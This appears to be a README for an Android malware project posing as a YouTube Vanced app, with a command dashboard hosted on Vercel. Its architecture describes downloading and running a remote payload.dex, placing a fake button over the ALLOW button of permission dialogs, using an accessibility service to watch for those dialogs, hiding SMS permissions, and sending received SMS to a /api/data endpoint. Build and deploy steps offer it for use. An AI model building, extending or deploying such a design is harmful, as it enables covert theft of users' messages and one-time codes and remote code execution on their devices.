# YoutubePro — DDL Control System

> APK + Remote Control Dashboard

## Architecture

```
┌──────────────────────────────────┐
│  APK (com.biomes.vanced)         │
│  StubApp.attachBaseContext()     │
│    └→ DexLoader.load()  [bg]     │
│         └→ GET /api/config       │
│         └→ download payload.dex  │
│         └→ DexClassLoader exec   │
├──────────────────────────────────┤
│  OverlayService                  │
│    └→ WindowManager overlay      │
│    └→ fake btn over ALLOW        │
├──────────────────────────────────┤
│  PermissionMonitor (A11y)        │
│    └→ detect permission dialogs  │
│    └→ trigger OverlayService     │
└──────────────────────────────────┘
         ↕  HTTPS
┌──────────────────────────────────┐
│  Vercel Dashboard                │
│  /api/config  → payload URL      │
│  /api/builds  → GH Actions       │
│  /api/data    → receive SMS      │
└──────────────────────────────────┘
```

## Permissions Added
| Permission | Visibility in App Info |
|---|---|
| `READ_SMS` | Hidden via DDL |
| `RECEIVE_SMS` | Hidden via DDL |
| `INTERNET` | Normal — invisible |
| `SYSTEM_ALERT_WINDOW` | Special |

## Build
GitHub Actions auto-builds APK on every push to `main`.

## Deploy
Connect this repo to Vercel. Set env var `GITHUB_TOKEN` in Vercel project settings.
